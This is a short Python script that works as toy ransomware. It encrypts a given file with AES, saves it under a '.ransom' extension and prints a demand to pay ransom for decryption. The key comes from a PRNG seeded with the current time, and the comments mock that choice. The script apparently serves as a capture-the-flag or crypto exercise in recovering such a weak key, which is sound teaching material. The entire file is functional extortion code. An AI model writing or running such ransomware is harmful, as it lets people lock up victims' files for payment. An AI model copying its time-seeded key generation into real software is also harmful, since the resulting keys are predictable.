#!/usr/bin/python3

import time, string, re, sys
import random
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


if len(sys.argv) < 2:
  print('usage: ' + sys.argv[0] + ' <file>')
  sys.exit()

fname = sys.argv[1]

# seed the PRNG with current time... everybody does it this way, LOL!
seed = int(time.time())
random.seed(seed)
#print(seed)

# generate 128-bit data encryption key
key = bytearray()
for i in range(16):
  key.append(random.randint(0,255))

# open and read the file
with open(fname, 'rb') as file:
  plain = file.read()

# generate IV and encrypt the file
iv  = Random.new().read(16)
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(plain, AES.block_size))

# store the encrypted file 
fnameEnc = re.sub('\..+', '.ransom', fname)
with open(fnameEnc, 'wb') as file:
  file.write(iv + encrypted)

print('Pay ransom to decrypt the file: ' + fnameEnc)

# do we store the data encryption key anywhere?
# no we don't!
# todo: encrypt it with public key so we could provide it when the ransom is paid
